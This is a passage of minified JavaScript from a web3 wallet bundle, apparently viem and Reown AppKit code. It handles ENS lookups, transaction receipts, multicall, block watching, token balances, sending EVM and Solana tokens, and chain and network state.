nq(t,e){const{blockNumber:r,blockTag:n,key:i,name:s,gatewayUrls:o,strict:a}=e,{chain:c}=t,u=(()=>{if(e.universalResolverAddress)return e.universalResolverAddress;if(!c)throw new Error("client chain not configured. universalResolverAddress is required.");return dh({blockNumber:r,chain:c,contract:"ensUniversalResolver"})})(),l=c==null?void 0:c.ensTlds;if(l&&!l.some(h=>s.endsWith(h)))return null;try{const h={address:u,abi:a2,functionName:"resolve",args:[bs(Dy(s)),Hc({abi:SE,functionName:"text",args:[ld(s),i]}),o??[w2]],blockNumber:r,blockTag:n},g=await dt(t,ca,"readContract")(h);if(g[0]==="0x")return null;const y=hh({abi:SE,functionName:"text",data:g[0]});return y===""?null:y}catch(h){if(a)throw h;if(ky(h,"resolve"))return null;throw h}}async function iq(t,{blockNumber:e,blockTag:r,assetGatewayUrls:n,name:i,gatewayUrls:s,strict:o,universalResolverAddress:a}){const c=await dt(t,nq,"getEnsText")({blockNumber:e,blockTag:r,key:"avatar",name:i,universalResolverAddress:a,gatewayUrls:s,strict:o});if(!c)return null;try{return await tq(t,{record:c,gatewayUrls:n})}catch{return null}}async function sq(t,{address:e,blockNumber:r,blockTag:n,gatewayUrls:i,strict:s,universalResolverAddress:o}){let a=o;if(!a){if(!t.chain)throw new Error("client chain not configured. universalResolverAddress is required.");a=dh({blockNumber:r,chain:t.chain,contract:"ensUniversalResolver"})}const c=`${e.toLowerCase().substring(2)}.addr.reverse`;try{const u={address:a,abi:sj,functionName:"reverse",args:[bs(Dy(c))],blockNumber:r,blockTag:n},l=dt(t,ca,"readContract"),[h,d]=i?await l({...u,args:[...u.args,i]}):await l(u);return e.toLowerCase()!==d.toLowerCase()?null:h}catch(u){if(s)throw u;if(ky(u,"reverse"))return null;throw u}}async function oq(t){const e=j9(t,{method:"eth_newPendingTransactionFilter"}),r=await t.request({method:"eth_newPendingTransactionFilter"});return{id:r,request:e(r),type:"transaction"}}function Uy(t){return{formatters:void 0,fees:void 0,serializers:void 0,...t}}const aq={"0x0":"reverted","0x1":"success"};function cq(t){const e={...t,blockNumber:t.blockNumber?BigInt(t.blockNumber):null,contractAddress:t.contractAddress?t.contractAddress:null,cumulativeGasUsed:t.cumulativeGasUsed?BigInt(t.cumulativeGasUsed):null,effectiveGasPrice:t.effectiveGasPrice?BigInt(t.effectiveGasPrice):null,gasUsed:t.gasUsed?BigInt(t.gasUsed):null,logs:t.logs?t.logs.map(r=>s2(r)):null,to:t.to?t.to:null,transactionIndex:t.transactionIndex?ia(t.transactionIndex):null,status:t.status?aq[t.status]:null,type:t.type?KI[t.type]||t.type:null};return t.blobGasPrice&&(e.blobGasPrice=BigInt(t.blobGasPrice)),t.blobGasUsed&&(e.blobGasUsed=BigInt(t.blobGasUsed)),e}class uq extends Y{constructor({value:e}){super(`Number \`${e}\` is not a valid decimal number.`,{name:"InvalidDecimalNumberError"})}}function lq(t,e){if(!/^(-?)([0-9]*)\.?([0-9]*)$/.test(t))throw new uq({value:t});let[r,n="0"]=t.split(".");const i=r.startsWith("-");if(i&&(r=r.slice(1)),n=n.replace(/(0+)$/,""),e===0)Math.round(+`.${n}`)===1&&(r=`${BigInt(r)+1n}`),n="";else if(n.length>e){const[s,o,a]=[n.slice(0,e-1),n.slice(e-1,e),n.slice(e)],c=Math.round(+`${o}.${a}`);c>9?n=`${BigInt(s)+BigInt(1)}0`.padStart(s.length+1,"0"):n=`${s}${c}`,n.length>e&&(n=n.slice(1),r=`${BigInt(r)+1n}`),n=n.slice(0,e)}else n=n.padEnd(e,"0");return BigInt(`${i?"-":""}${r}${n}`)}async function A2(t,{blockHash:e,blockNumber:r,blockTag:n,hash:i,index:s}){var l,h,d;const o=n||"latest",a=r!==void 0?Ue(r):void 0;let c=null;if(i?c=await t.request({method:"eth_getTransactionByHash",params:[i]},{dedupe:!0}):e?c=await t.request({method:"eth_getTransactionByBlockHashAndIndex",params:[e,Ue(s)]},{dedupe:!0}):c=await t.request({method:"eth_getTransactionByBlockNumberAndIndex",params:[a||o,Ue(s)]},{dedupe:!!a}),!c)throw new FI({blockHash:e,blockNumber:r,blockTag:o,hash:i,index:s});return(((d=(h=(l=t.chain)==null?void 0:l.formatters)==null?void 0:h.transaction)==null?void 0:d.format)||QI)(c)}async function DE(t,{hash:e}){var i,s,o;const r=await t.request({method:"eth_getTransactionReceipt",params:[e]},{dedupe:!0});if(!r)throw new jI({hash:e});return(((o=(s=(i=t.chain)==null?void 0:i.formatters)==null?void 0:s.transactionReceipt)==null?void 0:o.format)||cq)(r)}async function hq(t,e){var b;const{allowFailure:r=!0,batchSize:n,blockNumber:i,blockTag:s,multicallAddress:o,stateOverride:a}=e,c=e.contracts,u=n??(typeof((b=t.batch)==null?void 0:b.multicall)=="object"&&t.batch.multicall.batchSize||1024);let l=o;if(!l){if(!t.chain)throw new Error("client chain not configured. multicallAddress is required.");l=dh({blockNumber:i,chain:t.chain,contract:"multicall3"})}const h=[[]];let d=0,g=0;for(let A=0;A<c.length;A++){const{abi:_,address:T,args:P,functionName:S}=c[A];try{const C=Hc({abi:_,args:P,functionName:S});g+=(C.length-2)/2,u>0&&g>u&&h[d].length>0&&(d++,g=(C.length-2)/2,h[d]=[]),h[d]=[...h[d],{allowFailure:!0,callData:C,target:T}]}catch(C){const O=$d(C,{abi:_,address:T,args:P,docsPath:"/docs/contract/multicall",functionName:S});if(!r)throw O;h[d]=[...h[d],{allowFailure:!0,callData:"0x",target:T}]}}const y=await Promise.allSettled(h.map(A=>dt(t,ca,"readContract")({abi:w0,address:l,args:[A],blockNumber:i,blockTag:s,functionName:"aggregate3",stateOverride:a}))),m=[];for(let A=0;A<y.length;A++){const _=y[A];if(_.status==="rejected"){if(!r)throw _.reason;for(let P=0;P<h[A].length;P++)m.push({status:"failure",error:_.reason,result:void 0});continue}const T=_.value;for(let P=0;P<T.length;P++){const{returnData:S,success:C}=T[P],{callData:O}=h[A][P],{abi:$,address:D,functionName:F,args:j}=c[m.length];try{if(O==="0x")throw new Lf;if(!C)throw new _y({data:S});const L=hh({abi:$,args:j,data:S,functionName:F});m.push(r?{result:L,status:"success"}:L)}catch(L){const N=$d(L,{abi:$,address:D,args:j,docsPath:"/docs/contract/multicall",functionName:F});if(!r)throw N;m.push({error:N,result:void 0,status:"failure"})}}}if(m.length!==c.length)throw new Y("multicall results mismatch");return m}function dq(t,{emitOnBegin:e=!1,emitMissed:r=!1,onBlockNumber:n,onError:i,poll:s,pollingInterval:o=t.pollingInterval}){const a=typeof s<"u"?s:!(t.transport.type==="webSocket"||t.transport.type==="fallback"&&t.transport.transports[0].config.type==="webSocket");let c;return a?(()=>{const h=Wn(["watchBlockNumber",t.uid,e,r,o]);return jd(h,{onBlockNumber:n,onError:i},d=>f2(async()=>{var g;try{const y=await dt(t,_j,"getBlockNumber")({cacheTime:0});if(c){if(y===c)return;if(y-c>1&&r)for(let m=c+1n;m<y;m++)d.onBlockNumber(m,c),c=m}(!c||y>c)&&(d.onBlockNumber(y,c),c=y)}catch(y){(g=d.onError)==null||g.call(d,y)}},{emitOnBegin:e,interval:o}))})():(()=>{const h=Wn(["watchBlockNumber",t.uid,e,r]);return jd(h,{onBlockNumber:n,onError:i},d=>{let g=!0,y=()=>g=!1;return(async()=>{try{const m=(()=>{if(t.transport.type==="fallback"){const A=t.transport.transports.find(_=>_.config.type==="webSocket");return A?A.value:t.transport}return t.transport})(),{unsubscribe:b}=await m.subscribe({params:["newHeads"],onData(A){var T;if(!g)return;const _=Ec((T=A.result)==null?void 0:T.number);d.onBlockNumber(_,c),c=_},onError(A){var _;(_=d.onError)==null||_.call(d,A)}});y=b,g||y()}catch(m){i==null||i(m)}})(),()=>y()})})()}async function fq(t,{confirmations:e=1,hash:r,onReplaced:n,pollingInterval:i=t.pollingInterval,retryCount:s=6,retryDelay:o=({count:c})=>~~(1<<c)*200,timeout:a=18e4}){const c=Wn(["waitForTransactionReceipt",t.uid,r]);let u,l,h,d=!1;const{promise:g,resolve:y,reject:m}=l2(),b=a?setTimeout(()=>m(new d7({hash:r})),a):void 0,A=jd(c,{onReplaced:n,resolve:y,reject:m},_=>{const T=dt(t,dq,"watchBlockNumber")({emitMissed:!0,emitOnBegin:!0,poll:!0,pollingInterval:i,async onBlockNumber(P){const S=O=>{clearTimeout(b),T(),O(),A()};let C=P;if(!d)try{if(h){if(e>1&&(!h.blockNumber||C-h.blockNumber+1n<e))return;S(()=>_.resolve(h));return}if(u||(d=!0,await zd(async()=>{u=await dt(t,A2,"getTransaction")({hash:r}),u.blockNumber&&(C=u.blockNumber)},{delay:o,retryCount:s}),d=!1),h=await dt(t,DE,"getTransactionReceipt")({hash:r}),e>1&&(!h.blockNumber||C-h.blockNumber+1n<e))return;S(()=>_.resolve(h))}catch(O){if(O instanceof FI||O instanceof jI){if(!u){d=!1;return}try{l=u,d=!0;const $=await zd(()=>dt(t,yl,"getBlock")({blockNumber:C,includeTransactions:!0}),{delay:o,retryCount:s,shouldRetry:({error:j})=>j instanceof VI});d=!1;const D=$.transactions.find(({from:j,nonce:L})=>j===l.from&&L===l.nonce);if(!D||(h=await dt(t,DE,"getTransactionReceipt")({hash:D.hash}),e>1&&(!h.blockNumber||C-h.blockNumber+1n<e)))return;let F="replaced";D.to===l.to&&D.value===l.value&&D.input===l.input?F="repriced":D.from===D.to&&D.value===0n&&(F="cancelled"),S(()=>{var j;(j=_.onReplaced)==null||j.call(_,{reason:F,replacedTransaction:l,transaction:D,transactionReceipt:h}),_.resolve(h)})}catch($){S(()=>_.reject($))}}else S(()=>_.reject(O))}}})});return g}function pq(t,{batch:e=!0,onError:r,onTransactions:n,poll:i,pollingInterval:s=t.pollingInterval}){return(typeof i<"u"?i:t.transport.type!=="webSocket")?(()=>{const u=Wn(["watchPendingTransactions",t.uid,e,s]);return jd(u,{onTransactions:n,onError:r},l=>{let h;const d=f2(async()=>{var g;try{if(!h)try{h=await dt(t,oq,"createPendingTransactionFilter")({});return}catch(m){throw d(),m}const y=await dt(t,Cj,"getFilterChanges")({filter:h});if(y.length===0)return;if(e)l.onTransactions(y);else for(const m of y)l.onTransactions([m])}catch(y){(g=l.onError)==null||g.call(l,y)}},{emitOnBegin:!0,interval:s});return async()=>{h&&await dt(t,Ij,"uninstallFilter")({filter:h}),d()}})})():(()=>{let u=!0,l=()=>u=!1;return(async()=>{try{const{unsubscribe:h}=await t.transport.subscribe({params:["newPendingTransactions"],onData(d){if(!u)return;const g=d.result;n([g])},onError(d){r==null||r(d)}});l=h,u||l()}catch(h){r==null||r(h)}})(),()=>l()})()}async function gq(t,{account:e=t.account,message:r}){if(!e)throw new Ry({docsPath:"/docs/actions/wallet/signMessage"});const n=Vi(e);if(n.signMessage)return n.signMessage({message:r});const i=typeof r=="string"?Ff(r):r.raw instanceof Uint8Array?bs(r.raw):r.raw;return t.request({method:"personal_sign",params:[i,n.address]},{retryCount:0})}const Ng={createBalance(t,e){const r={name:t.metadata.name||"",symbol:t.metadata.symbol||"",decimals:t.metadata.decimals||0,value:t.metadata.value||0,price:t.metadata.price||0,iconUrl:t.metadata.iconUrl||""};return{name:r.name,symbol:r.symbol,chainId:e,address:t.address==="native"?void 0:this.convertAddressToCAIP10Address(t.address,e),value:r.value,price:r.price,quantity:{decimals:r.decimals.toString(),numeric:this.convertHexToBalance({hex:t.balance,decimals:r.decimals})},iconUrl:r.iconUrl}},convertHexToBalance({hex:t,decimals:e}){return Wc(BigInt(t),e)},convertAddressToCAIP10Address(t,e){return`${e}:${t}`},createCAIP2ChainId(t,e){return`${e}:${parseInt(t,16)}`},getChainIdHexFromCAIP2ChainId(t){const e=t.split(":");if(e.length<2||!e[1])return"0x0";const r=e[1],n=parseInt(r,10);return isNaN(n)?"0x0":`0x${n.toString(16)}`},isWalletGetAssetsResponse(t){return typeof t!="object"||t===null?!1:Object.values(t).every(e=>Array.isArray(e)&&e.every(r=>this.isValidAsset(r)))},isValidAsset(t){return typeof t=="object"&&t!==null&&typeof t.address=="string"&&typeof t.balance=="string"&&(t.type==="ERC20"||t.type==="NATIVE")&&typeof t.metadata=="object"&&t.metadata!==null&&typeof t.metadata.name=="string"&&typeof t.metadata.symbol=="string"&&typeof t.metadata.decimals=="number"&&typeof t.metadata.price=="number"&&typeof t.metadata.iconUrl=="string"}},ME={async getMyTokensWithBalance(t){const e=pe.state.address,r=q.state.activeCaipNetwork;if(!e||!r)return[];if(r.chainNamespace==="eip155"){const i=await this.getEIP155Balances(e,r);if(i)return this.filterLowQualityTokens(i)}const n=await _e.getBalance(e,r.caipNetworkId,t);return this.filterLowQualityTokens(n.balances)},async getEIP155Balances(t,e){var r,n;try{const i=Ng.getChainIdHexFromCAIP2ChainId(e.caipNetworkId),s=await At.getCapabilities(t);if(!((n=(r=s==null?void 0:s[i])==null?void 0:r.assetDiscovery)!=null&&n.supported))return null;const o=await At.walletGetAssets({account:t,chainFilter:[i]});return Ng.isWalletGetAssetsResponse(o)?(o[i]||[]).map(c=>Ng.createBalance(c,e.caipNetworkId)):null}catch{return null}},filterLowQualityTokens(t){return t.filter(e=>e.quantity.decimals!=="0")},mapBalancesToSwapTokens(t){return(t==null?void 0:t.map(e=>({...e,address:e!=null&&e.address?e.address:q.getActiveNetworkTokenAddress(),decimals:parseInt(e.quantity.decimals,10),logoUri:e.iconUrl,eip2612:!1})))||[]}},qe=Kt({tokenBalances:[],loading:!1}),BE={state:qe,subscribe(t){return Xr(qe,()=>t(qe))},subscribeKey(t,e){return tn(qe,t,e)},setToken(t){t&&(qe.token=Jo(t))},setTokenAmount(t){qe.sendTokenAmount=t},setReceiverAddress(t){qe.receiverAddress=t},setReceiverProfileImageUrl(t){qe.receiverProfileImageUrl=t},setReceiverProfileName(t){qe.receiverProfileName=t},setGasPrice(t){qe.gasPrice=t},setGasPriceInUsd(t){qe.gasPriceInUSD=t},setNetworkBalanceInUsd(t){qe.networkBalanceInUSD=t},setLoading(t){qe.loading=t},sendToken(){var t;switch((t=q.state.activeCaipNetwork)==null?void 0:t.chainNamespace){case"eip155":this.sendEvmToken();return;case"solana":this.sendSolanaToken();return;default:throw new Error("Unsupported chain")}},sendEvmToken(){var r,n,i,s,o,a;const t=q.state.activeChain,e=(r=pe.state.preferredAccountTypes)==null?void 0:r[t];(n=this.state.token)!=null&&n.address&&this.state.sendTokenAmount&&this.state.receiverAddress?(wt.sendEvent({type:"track",event:"SEND_INITIATED",properties:{isSmartAccount:e===cr.ACCOUNT_TYPES.SMART_ACCOUNT,token:this.state.token.address,amount:this.state.sendTokenAmount,network:((i=q.state.activeCaipNetwork)==null?void 0:i.caipNetworkId)||""}}),this.sendERC20Token({receiverAddress:this.state.receiverAddress,tokenAddress:this.state.token.address,sendTokenAmount:this.state.sendTokenAmount,decimals:this.state.token.quantity.decimals})):this.state.receiverAddress&&this.state.sendTokenAmount&&this.state.gasPrice&&((s=this.state.token)!=null&&s.quantity.decimals)&&(wt.sendEvent({type:"track",event:"SEND_INITIATED",properties:{isSmartAccount:e===cr.ACCOUNT_TYPES.SMART_ACCOUNT,token:(o=this.state.token)==null?void 0:o.symbol,amount:this.state.sendTokenAmount,network:((a=q.state.activeCaipNetwork)==null?void 0:a.caipNetworkId)||""}}),this.sendNativeToken({receiverAddress:this.state.receiverAddress,sendTokenAmount:this.state.sendTokenAmount,gasPrice:this.state.gasPrice,decimals:this.state.token.quantity.decimals}))},async fetchTokenBalance(t){var s,o;qe.loading=!0;const e=(s=q.state.activeCaipNetwork)==null?void 0:s.caipNetworkId,r=(o=q.state.activeCaipNetwork)==null?void 0:o.chainNamespace,n=q.state.activeCaipAddress,i=n?Ie.getPlainAddress(n):void 0;if(qe.lastRetry&&!Ie.isAllowedRetry(qe.lastRetry,30*Ar.ONE_SEC_MS))return qe.loading=!1,[];try{if(i&&e&&r){const a=await ME.getMyTokensWithBalance();return qe.tokenBalances=a,qe.lastRetry=void 0,a}}catch(a){qe.lastRetry=Date.now(),t==null||t(a),kr.showError("Token Balance Unavailable")}finally{qe.loading=!1}return[]},fetchNetworkBalance(){if(qe.tokenBalances.length===0)return;const t=ME.mapBalancesToSwapTokens(qe.tokenBalances);if(!t)return;const e=t.find(r=>r.address===q.getActiveNetworkTokenAddress());e&&(qe.networkBalanceInUSD=e?Ah.multiply(e.quantity.numeric,e.price).toString():"0")},isInsufficientNetworkTokenForGas(t,e){const r=e||"0";return Ah.bigNumber(t).eq(0)?!0:Ah.bigNumber(Ah.bigNumber(r)).gt(t)},hasInsufficientGasFunds(){var r;const t=q.state.activeChain;let e=!0;return((r=pe.state.preferredAccountTypes)==null?void 0:r[t])===cr.ACCOUNT_TYPES.SMART_ACCOUNT?e=!1:qe.networkBalanceInUSD&&(e=this.isInsufficientNetworkTokenForGas(qe.networkBalanceInUSD,qe.gasPriceInUSD)),e},async sendNativeToken(t){var o,a,c,u,l,h;const e=q.state.activeChain;at.pushTransactionStack({view:"Account",goBack:!1});const r=t.receiverAddress,n=pe.state.address,i=At.parseUnits(t.sendTokenAmount.toString(),Number(t.decimals)),s="0x";try{await At.sendTransaction({chainNamespace:"eip155",to:r,address:n,data:s,value:i??BigInt(0),gasPrice:t.gasPrice}),kr.showSuccess("Transaction started"),wt.sendEvent({type:"track",event:"SEND_SUCCESS",properties:{isSmartAccount:((o=pe.state.preferredAccountTypes)==null?void 0:o[e])===cr.ACCOUNT_TYPES.SMART_ACCOUNT,token:((a=this.state.token)==null?void 0:a.symbol)||"",amount:t.sendTokenAmount,network:((c=q.state.activeCaipNetwork)==null?void 0:c.caipNetworkId)||""}}),this.resetSend()}catch(d){console.error("SendController:sendERC20Token - failed to send native token",d);const g=d instanceof Error?d.message:"Unknown error";wt.sendEvent({type:"track",event:"SEND_ERROR",properties:{message:g,isSmartAccount:((u=pe.state.preferredAccountTypes)==null?void 0:u[e])===cr.ACCOUNT_TYPES.SMART_ACCOUNT,token:((l=this.state.token)==null?void 0:l.symbol)||"",amount:t.sendTokenAmount,network:((h=q.state.activeCaipNetwork)==null?void 0:h.caipNetworkId)||""}}),kr.showError("Something went wrong")}},async sendERC20Token(t){var r,n,i;at.pushTransactionStack({view:"Account",goBack:!1});const e=At.parseUnits(t.sendTokenAmount.toString(),Number(t.decimals));try{if(pe.state.address&&t.sendTokenAmount&&t.receiverAddress&&t.tokenAddress){const s=Ie.getPlainAddress(t.tokenAddress);await At.writeContract({fromAddress:pe.state.address,tokenAddress:s,args:[t.receiverAddress,e??BigInt(0)],method:"transfer",abi:SS.getERC20Abi(s),chainNamespace:"eip155"}),kr.showSuccess("Transaction started"),this.resetSend()}}catch(s){console.error("SendController:sendERC20Token - failed to send erc20 token",s);const o=s instanceof Error?s.message:"Unknown error";wt.sendEvent({type:"track",event:"SEND_ERROR",properties:{message:o,isSmartAccount:((r=pe.state.preferredAccountTypes)==null?void 0:r.eip155)===cr.ACCOUNT_TYPES.SMART_ACCOUNT,token:((n=this.state.token)==null?void 0:n.symbol)||"",amount:t.sendTokenAmount,network:((i=q.state.activeCaipNetwork)==null?void 0:i.caipNetworkId)||""}}),kr.showError("Something went wrong")}},sendSolanaToken(){if(!this.state.sendTokenAmount||!this.state.receiverAddress){kr.showError("Please enter a valid amount and receiver address");return}at.pushTransactionStack({view:"Account",goBack:!1}),At.sendTransaction({chainNamespace:"solana",to:this.state.receiverAddress,value:this.state.sendTokenAmount}).then(()=>{this.resetSend(),pe.fetchTokenBalance()}).catch(t=>{kr.showError("Failed to send transaction. Please try again."),console.error("SendController:sendToken - failed to send solana transaction",t)})},resetSend(){qe.token=void 0,qe.sendTokenAmount=void 0,qe.receiverAddress=void 0,qe.receiverProfileImageUrl=void 0,qe.receiverProfileName=void 0,qe.loading=!1,qe.tokenBalances=[]}},Tg={currentTab:0,tokenBalance:[],smartAccountDeployed:!1,addressLabels:new Map,allAccounts:[],user:void 0},Wh={caipNetwork:void 0,supportsAllNetworks:!0,smartAccountEnabledNetworks:[]},ce=Kt({chains:pS(),activeCaipAddress:void 0,activeChain:void 0,activeCaipNetwork:void 0,noAdapters:!1,universalAdapter:{networkControllerClient:void 0,connectionControllerClient:void 0},isSwitchingNamespace:!1}),q={state:ce,subscribe(t){return Xr(ce,()=>{t(ce)})},subscribeKey(t,e){return tn(ce,t,e)},subscribeChainProp(t,e,r){let n;return Xr(ce.chains,()=>{var s;const i=r||ce.activeChain;if(i){const o=(s=ce.chains.get(i))==null?void 0:s[t];n!==o&&(n=o,e(o))}})},initialize(t,e,r){const{chainId:n,namespace:i}=le.getActiveNetworkProps(),s=e==null?void 0:e.find(u=>u.id.toString()===(n==null?void 0:n.toString())),a=t.find(u=>(u==null?void 0:u.namespace)===i)||(t==null?void 0:t[0]),c=new Set([...(e==null?void 0:e.map(u=>u.chainNamespace))??[]]);((t==null?void 0:t.length)===0||!a)&&(ce.noAdapters=!0),ce.noAdapters||(ce.activeChain=a==null?void 0:a.namespace,ce.activeCaipNetwork=s,this.setChainNetworkData(a==null?void 0:a.namespace,{caipNetwork:s}),ce.activeChain&&$i.set({activeChain:a==null?void 0:a.namespace})),c.forEach(u=>{const l=e==null?void 0:e.filter(h=>h.chainNamespace===u);q.state.chains.set(u,{namespace:u,networkState:Kt({...Wh,caipNetwork:l==null?void 0:l[0]}),accountState:Kt(Tg),caipNetworks:l??[],...r}),this.setRequestedCaipNetworks(l??[],u)})},removeAdapter(t){var e,r;if(ce.activeChain===t){const n=Array.from(ce.chains.entries()).find(([i])=>i!==t);if(n){const i=(r=(e=n[1])==null?void 0:e.caipNetworks)==null?void 0:r[0];i&&this.setActiveCaipNetwork(i)}}ce.chains.delete(t)},addAdapter(t,{networkControllerClient:e,connectionControllerClient:r},n){ce.chains.set(t.namespace,{namespace:t.namespace,networkState:{...Wh,caipNetwork:n[0]},accountState:Tg,caipNetworks:n,connectionControllerClient:r,networkControllerClient:e}),this.setRequestedCaipNetworks((n==null?void 0:n.filter(i=>i.chainNamespace===t.namespace))??[],t.namespace)},addNetwork(t){var r;const e=ce.chains.get(t.chainNamespace);if(e){const n=[...e.caipNetworks||[]];(r=e.caipNetworks)!=null&&r.find(i=>i.id===t.id)||n.push(t),ce.chains.set(t.chainNamespace,{...e,caipNetworks:n}),this.setRequestedCaipNetworks(n,t.chainNamespace)}},removeNetwork(t,e){var n,i,s;const r=ce.chains.get(t);if(r){const o=((n=ce.activeCaipNetwork)==null?void 0:n.id)===e,a=[...((i=r.caipNetworks)==null?void 0:i.filter(c=>c.id!==e))||[]];o&&((s=r==null?void 0:r.caipNetworks)!=null&&s[0])&&this.setActiveCaipNetwork(r.caipNetworks[0]),ce.chains.set(t,{...r,caipNetworks:a}),this.setRequestedCaipNetworks(a||[],t)}},setAdapterNetworkState(t,e){const r=ce.chains.get(t);r&&(r.networkState={...r.networkState||Wh,...e},ce.chains.set(t,r))},setChainAccountData(t,e,r=!0){if(!t)throw new Error("Chain is required to update chain account data");const n=ce.chains.get(t);if(n){const i={...n.accountState||Tg,...e};ce.chains.set(t,{...n,accountState:i}),(ce.chains.size===1||ce.activeChain===t)&&(e.caipAddress&&(ce.activeCaipAddress=e.caipAddress),pe.replaceState(i))}},setChainNetworkData(t,e){if(!t)return;const r=ce.chains.get(t);if(r){const n={...r.networkState||Wh,...e};ce.chains.set(t,{...r,networkState:n})}},setAccountProp(t,e,r,n=!0){this.setChainAccountData(r,{[t]:e},n),t==="status"&&e==="disconnected"&&r&&Oe.removeConnectorId(r)},setActiveNamespace(t){var n,i;ce.activeChain=t;const e=t?ce.chains.get(t):void 0,r=(n=e==null?void 0:e.networkState)==null?void 0:n.caipNetwork;r!=null&&r.id&&t&&(ce.activeCaipAddress=(i=e==null?void 0:e.accountState)==null?void 0:i.caipAddress,ce.activeCaipNetwork=r,this.setChainNetworkData(t,{caipNetwork:r}),le.setActiveCaipNetworkId(r==null?void 0:r.caipNetworkId),$i.set({activeChain:t,selectedNetworkId:r==null?void 0:r.caipNetworkId}))},setActiveCaipNetwork(t){var n,i,s;if(!t)return;ce.activeChain!==t.chainNamespace&&this.setIsSwitchingNamespace(!0);const e=ce.chains.get(t.chainNamespace);ce.activeChain=t.chainNamespace,ce.activeCaipNetwork=t,this.setChainNetworkData(t.chainNamespace,{caipNetwork:t}),(n=e==null?void 0:e.accountState)!=null&&n.address?ce.activeCaipAddress=`${t.chainNamespace}:${t.id}:${(i=e==null?void 0:e.accountState)==null?void 0:i.address}`:ce.activeCaipAddress=void 0,this.setAccountProp("caipAddress",ce.activeCaipAddress,t.chainNamespace),e&&pe.replaceState(e.accountState),BE.resetSend(),$i.set({activeChain:ce.activeChain,selectedNetworkId:(s=ce.activeCaipNetwork)==null?void 0:s.caipNetworkId}),le.setActiveCaipNetworkId(t.caipNetworkId),!this.checkIfSupportedNetwork(t.chainNamespace)&&te.state.enableNetworkSwitch&&!te.state.allowUnsupportedChain&&!At.state.wcBasic&&this.showUnsupportedChainUI()},addCaipNetwork(t){var r;if(!t)return;const e=ce.chains.get(t.chainNamespace);e&&((r=e==null?void 0:e.caipNetworks)==null||r.push(t))},async switchActiveNamespace(t){var i;if(!t)return;const e=t!==q.state.activeChain,r=(i=q.getNetworkData(t))==null?void 0:i.caipNetwork,n=q.getCaipNetworkByNamespace(t,r==null?void 0:r.id);e&&n&&await q.switchActiveNetwork(n)},async switchActiveNetwork(t){var i;const e=q.state.chains.get(q.state.activeChain);!((i=e==null?void 0:e.caipNetworks)!=null&&i.some(s=>{var o;return s.id===((o=ce.activeCaipNetwork)==null?void 0:o.id)}))&&at.goBack();const n=this.getNetworkControllerClient(t.chainNamespace);n&&(await n.switchCaipNetwork(t),wt.sendEvent({type:"track",event:"SWITCH_NETWORK",properties:{network:t.caipNetworkId}}))},getNetworkControllerClient(t){const e=t||ce.activeChain,r=ce.chains.get(e);if(!r)throw new Error("Chain adapter not found");if(!r.networkControllerClient)throw new Error("NetworkController client not set");return r.networkControllerClient},getConnectionControllerClient(t){const e=t||ce.activeChain;if(!e)throw new Error("Chain is required to get connection controller client");const r=ce.chains.get(e);if(!(r!=null&&r.connectionControllerClient))throw new Error("ConnectionController client not set");return r.connectionControllerClient},getAccountProp(t,e){var i;let r=ce.activeChain;if(e&&(r=e),!r)return;const n=(i=ce.chains.get(r))==null?void 0:i.accountState;if(n)return n[t]},getNetworkProp(t,e){var n;const r=(n=ce.chains.get(e))==null?void 0:n.networkState;if(r)return r[t]},getRequestedCaipNetworks(t){const e=ce.chains.get(t),{approvedCaipNetworkIds:r=[],requestedCaipNetworks:n=[]}=(e==null?void 0:e.networkState)||{};return Ie.sortRequestedNetworks(r,n)},getAllRequestedCaipNetworks(){const t=[];return ce.chains.forEach(e=>{const r=this.getRequestedCaipNetworks(e.namespace);t.push(...r)}),t},setRequestedCaipNetworks(t,e){this.setAdapterNetworkState(e,{requestedCaipNetworks:t})},getAllApprovedCaipNetworkIds(){const t=[];return ce.chains.forEach(e=>{const r=this.getApprovedCaipNetworkIds(e.namespace);t.push(...r)}),t},getActiveCaipNetwork(){return ce.activeCaipNetwork},getActiveCaipAddress(){return ce.activeCaipAddress},getApprovedCaipNetworkIds(t){var n;const e=ce.chains.get(t);return((n=e==null?void 0:e.networkState)==null?void 0:n.approvedCaipNetworkIds)||[]},async setApprovedCaipNetworksData(t){const e=this.getNetworkControllerClient(),r=await(e==null?void 0:e.getApprovedCaipNetworksData());this.setAdapterNetworkState(t,{approvedCaipNetworkIds:r==null?void 0:r.approvedCaipNetworkIds,supportsAllNetworks:r==null?void 0:r.supportsAllNetworks})},checkIfSupportedNetwork(t,e){const r=e||ce.activeCaipNetwork,n=this.getRequestedCaipNetworks(t);return n.length?n==null?void 0:n.some(i=>i.id===(r==null?void 0:r.id)):!0},checkIfSupportedChainId(t){if(!ce.activeChain)return!0;const e=this.getRequestedCaipNetworks(ce.activeChain);return e==null?void 0:e.some(r=>r.id===t)},setSmartAccountEnabledNetworks(t,e){this.setAdapterNetworkState(e,{smartAccountEnabledNetworks:t})},checkIfSmartAccountEnabled(){var n;const t=qu.caipNetworkIdToNumber((n=ce.activeCaipNetwork)==null?void 0:n.caipNetworkId),e=ce.activeChain;if(!e||!t)return!1;const r=this.getNetworkProp("smartAccountEnabledNetworks",e);return!!(r!=null&&r.includes(Number(t)))},getActiveNetworkTokenAddress(){var n,i;const t=((n=ce.activeCaipNetwork)==null?void 0:n.chainNamespace)||"eip155",e=((i=ce.activeCaipNetwork)==null?void 0:i.id)||1,r=Ar.NATIVE_TOKEN_ADDRESS[t];return`${t}:${e}:${r}`},showUnsupportedChainUI(){nr.open({view:"UnsupportedChain"})},checkIfNamesSupported(){const t=ce.activeCaipNetwork;return!!(t!=null&&t.chainNamespace&&Ar.NAMES_SUPPORTED_CHAIN_NAMESPACES.includes(t.chainNamespace))},resetNetwork(t){this.setAdapterNetworkState(t,{approvedCaipNetworkIds:void 0,supportsAllNetworks:!0,smartAccountEnabledNetworks:[]})},resetAccount(t){const e=t;if(!e)throw new Error("Chain is required to set account prop");ce.activeCaipAddress=void 0,this.setChainAccountData(e,{smartAccountDeployed:!1,currentTab:0,caipAddress:void 0,address:void 0,balance:void 0,balanceSymbol:void 0,profileName:void 0,profileImage:void 0,addressExplorerUrl:void 0,tokenBalance:[],connectedWalletInfo:void 0,preferredAccountTypes:void 0,socialProvider:void 0,socialWindow:void 0,farcasterUrl:void 0,allAccounts:[],user:void 0,status:"disconnected"}),Oe.removeConnectorId(e)},async disconnect(t){const e=LS(t);try{BE.resetSend();const r=await Promise.allSettled(e.map(async([i,s])=>{var o;try{const{caipAddress:a}=this.getAccountData(i)||{};a&&((o=s.connectionControllerClient)!=null&&o.disconnect)&&await s.connectionControllerClient.disconnect(i),this.resetAccount(i),this.resetNetwork(i)}catch(a){throw new Error(`Failed to disconnect chain ${i}: 